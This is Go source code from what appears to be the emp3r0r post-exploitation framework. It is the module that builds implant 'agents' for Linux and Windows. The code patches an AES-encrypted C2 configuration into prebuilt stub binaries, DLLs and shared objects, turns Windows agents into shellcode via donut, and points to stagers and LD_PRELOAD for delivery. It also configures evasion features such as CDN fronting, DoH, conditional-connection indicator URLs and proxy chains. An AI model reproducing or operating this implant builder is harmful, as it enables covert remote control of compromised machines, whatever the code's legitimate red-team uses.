package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/donut"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var Arch_List_Windows = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Windows_DLL = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Linux_SO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// CmdGenerateAgent generates agent binary
func CmdGenerateAgent(cmd *cobra.Command, args []string) {
	var outfile string // write agent binary to this path

	// check if we have all required options
	payload_type, _ := cmd.Flags().GetString("type")
	arch_choice, _ := cmd.Flags().GetString("arch")

	if !isArchValid(payload_type, arch_choice) {
		logging.Errorf("Invalid arch choice")
		return
	}

	// file paths
	now := time.Now()
	stubFile := ""
	stubFile, outfile = generateFilePaths(payload_type, arch_choice, now)

	// is this stub file available?
	if !util.IsExist(stubFile) {
		logging.Errorf("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	if err := MakeConfig(cmd); err != nil {
		logging.Errorf("Failed to configure agent: %v", err)
		return
	}

	// read and encrypt config file
	encryptedJSONBytes, err := readAndEncryptConfig()
	if err != nil {
		logging.Errorf("Failed to encrypt %s: %v", live.EmpConfigFile, err)
		return
	}

	// read stub file
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		logging.Errorf("Read stub: %v", err)
		return
	}
	sep := bytes.Repeat(def.OneTimeMagicBytes, 2)

	// payload
	config_payload := append(sep, encryptedJSONBytes...)
	config_payload = append(config_payload, sep...)
	// binary patching, we need to patch the stub file at emp3r0r_def.AgentConfig, which is 4096 bytes long
	if len(config_payload) < len(def.AgentConfig) {
		// pad with 0x00
		config_payload = append(config_payload, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(config_payload))...)
	} else if len(config_payload) > len(def.AgentConfig) {
		logging.Errorf("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(def.AgentConfig))
		return
	}
	// fill in
	toWrite = bytes.Replace(toWrite,
		// by now config_payload should be 4096 bytes long
		bytes.Repeat([]byte{0xff}, len(config_payload)),
		config_payload,
		1)
	// verify
	if !bytes.Contains(toWrite, config_payload) {
		logging.Warningf("Failed to patch %s with config payload, config data not found, append it to the file instead", stubFile)
		// append config to the end of the file
		err = appendConfigToPayload(stubFile, sep, encryptedJSONBytes)
		if err != nil {
			logging.Errorf("Failed to append config to payload: %v", err)
			return
		}
	}
	// write
	if err = os.WriteFile(outfile, toWrite, 0o755); err != nil {
		logging.Errorf("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	logging.Successf("Generated %s from %s and %s",
		outfile, stubFile, live.EmpConfigFile)
	logging.Debugf("OneTimeMagicBytes is %x", def.OneTimeMagicBytes)

	if payload_type == PayloadTypeWindowsExecutable {
		// generate shellcode for the agent binary
		donut.DonoutPE2Shellcode(outfile, arch_choice)
	}
	if payload_type == PayloadTypeLinuxExecutable {
		// tell user to use shared library stager
		logging.Printf("Use stager module to create a shared library stager that delivers the agent with encryption and compression. You will need another stager to load the shared library (or use LD_PRELOAD)")
	}
}

func isArchValid(payload_type, arch_choice string) bool {
	var list []string
	switch payload_type {
	case PayloadTypeWindowsExecutable:
		list = Arch_List_Windows
	case PayloadTypeWindowsDLL:
		list = Arch_List_Windows_DLL
	case PayloadTypeLinuxSO:
		list = Arch_List_Linux_SO
	default:
		list = Arch_List_All
	}
	for _, a := range list {
		if arch_choice == a {
			return true
		}
	}
	return false
}

func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFile, outfile string) {
	logging.Infof("Generating '%s'", PayloadTypeLinuxExecutable)
	switch payload_type {
	case PayloadTypeLinuxExecutable:
		stubFile = fmt.Sprintf("stub-%s", arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			live.EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeWindowsExecutable:
		stubFile = fmt.Sprintf("stub-win-%s", arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			live.EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeWindowsDLL:
		stubFile = fmt.Sprintf("stub-win-%s.dll", arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
			live.EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeLinuxSO:
		stubFile = fmt.Sprintf("stub-%s.so", arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
			live.EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	default:
		logging.Errorf("Unsupported: '%s'", payload_type)
	}
	return
}

func readAndEncryptConfig() ([]byte, error) {
	// read file
	jsonBytes, err := os.ReadFile(live.EmpConfigFile)
	if err != nil {
		return nil, fmt.Errorf("parsing def.EmpConfigFile config file: %v", err)
	}

	// encrypt
	encryptedJSONBytes, err := crypto.AES_GCM_Encrypt(def.OneTimeMagicBytes, jsonBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt %s: %v", live.EmpConfigFile, err)
	}

	return encryptedJSONBytes, nil
}

func appendConfigToPayload(file string, sep, config []byte) (err error) {
	bin_data, err := os.ReadFile(file)
	if err != nil {
		err = fmt.Errorf("failed to read file %s: %v", file, err)
		return
	}
	toWrite := append(bin_data, sep...)
	toWrite = append(toWrite, config...)
	toWrite = append(toWrite, sep...)
	err = os.WriteFile(file, toWrite, 0o755)
	if err != nil {
		err = fmt.Errorf("failed to save final agent binary: %v", err)
		return
	}

	return
}

func MakeConfig(cmd *cobra.Command) (err error) {
	cc_host, _ := cmd.Flags().GetString("cc")
	indicator_url, _ := cmd.Flags().GetString("indicator")
	indicator_wait_min, _ := cmd.Flags().GetInt("indicator-wait-min")
	indicator_wait_max, _ := cmd.Flags().GetInt("indicator-wait-max")
	cdn_proxy, _ := cmd.Flags().GetString("cdn")
	c2transport_proxy, _ := cmd.Flags().GetString("proxy")
	doh_server, _ := cmd.Flags().GetString("doh")
	proxy_chain, _ := cmd.Flags().GetBool("proxychain")
	ncsi, _ := cmd.Flags().GetBool("ncsi")
	kcp, _ := cmd.Flags().GetBool("kcp")

	// read existing config when possible
	var config_map map[string]interface{}
	if util.IsExist(live.EmpConfigFile) {
		logging.Infof("Reading config from existing %s", live.EmpConfigFile)
		jsonData, err := os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", live.EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			return fmt.Errorf("parsing existing %s: %v", live.EmpConfigFile, err)
		}
	}

	// CC names and certs
	live.RuntimeConfig.CCHost = cc_host
	logging.Printf("C2 server name: %s", live.RuntimeConfig.CCHost)
	existing_names := transport.NamesInCert(live.ServerCrtFile)
	cc_hosts := existing_names
	exists := false
	for _, c2_name := range existing_names {
		if c2_name == live.RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		logging.Warningf("Name '%s' is not covered by our server cert, re-generating",
			live.RuntimeConfig.CCHost)
		cc_hosts = append(cc_hosts, live.RuntimeConfig.CCHost) // append new name
		// remove old certs
		os.RemoveAll(live.ServerCrtFile)
		os.RemoveAll(live.ServerKeyFile)
		_, err = transport.GenCerts(cc_hosts, live.ServerCrtFile, live.ServerKeyFile, false)
		if err != nil {
			return fmt.Errorf("failed to generate certs: %v", err)
		}
		err = network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		if err != nil {
			return fmt.Errorf("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
				err, live.RuntimeConfig.CCHost)
		} else {
			logging.Warningf("Restarting C2 TLS service at port %s to apply new server cert", live.RuntimeConfig.CCPort)

			c2_names := transport.NamesInCert(live.ServerCrtFile)
			if len(c2_names) <= 0 {
				return fmt.Errorf("no valid host names in server cert")
			}
			name_list := strings.Join(c2_names, ", ")
			logging.Infof("Updated C2 server names: %s", name_list)
			go server.StartTLSServer()
		}
	}

	// CC indicator
	live.RuntimeConfig.CCIndicatorURL = indicator_url
	if live.RuntimeConfig.CCIndicatorURL != "" {
		live.RuntimeConfig.CCIndicatorWaitMin = indicator_wait_min
		live.RuntimeConfig.CCIndicatorWaitMax = indicator_wait_max
		logging.Printf("Remember to enable your indicator at %s. Agents will wait between %d to %d seconds for conditional C2 connection",
			live.RuntimeConfig.CCIndicatorURL, live.RuntimeConfig.CCIndicatorWaitMin, live.RuntimeConfig.CCIndicatorWaitMax)
	}

	// Internet check
	live.RuntimeConfig.EnableNCSI = ncsi
	if live.RuntimeConfig.EnableNCSI {
		logging.Printf("NCSI is enabled")
	}

	// CDN proxy
	live.RuntimeConfig.CDNProxy = cdn_proxy
	if live.RuntimeConfig.CDNProxy != "" {
		logging.Printf("Using CDN proxy %s", live.RuntimeConfig.CDNProxy)
	}

	live.RuntimeConfig.UseKCP = kcp
	if kcp {
		logging.Printf("Using KCP")
	}

	// agent proxy for c2 transport
	live.RuntimeConfig.C2TransportProxy = c2transport_proxy
	if live.RuntimeConfig.C2TransportProxy != "" {
		logging.Printf("Using C2 transport proxy %s", live.RuntimeConfig.C2TransportProxy)
	}

	live.RuntimeConfig.DoHServer = doh_server
	if live.RuntimeConfig.DoHServer != "" {
		logging.Printf("Using DoH server %s", live.RuntimeConfig.DoHServer)
	}
	if !proxy_chain {
		live.RuntimeConfig.ProxyChainBroadcastIntervalMax = 0
		logging.Printf("Proxy chain is disabled")
	}

	// save emp3r0r.json
	return live.SaveConfigJSON()
}
